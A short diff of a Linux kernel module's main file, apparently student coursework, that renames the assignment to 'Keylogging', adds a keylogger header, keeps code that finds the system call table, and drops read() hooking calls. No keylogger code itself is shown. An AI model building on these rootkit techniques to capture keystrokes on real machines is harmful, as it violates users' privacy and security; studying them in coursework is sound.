@@ -3,10 +3,11 @@
 #include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
 
 #include "hooking.h"
-#include "read_hooking.h"
+#include "commands.h"
+#include "keylogger.h"
 
 #define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
-#define DRIVER_DESC   "Assigment 8 - Finding Data Structures"
+#define DRIVER_DESC   "Assigment 9 - Keylogging"
 
 static void ** sct;
 static int __init mod_init(void)
@@ -15,7 +16,6 @@ static int __init mod_init(void)
 	if(sct != NULL)
 		printk(KERN_INFO "syscall table:%016lx\n",(long unsigned int) sct);
 	else return 0;
-	hook_read(sct);
 
   return 0;
 }
@@ -23,7 +23,6 @@ static int __init mod_init(void)
 static void __exit mod_exit(void)
 {
 	if(sct == NULL) return;
-	unhook_read(sct);
 }
 
 
@@ -34,4 +33,3 @@ module_exit(mod_exit);
 MODULE_AUTHOR(DRIVER_AUTHOR);
 MODULE_DESCRIPTION(DRIVER_DESC);
 MODULE_LICENSE("GPL");
-
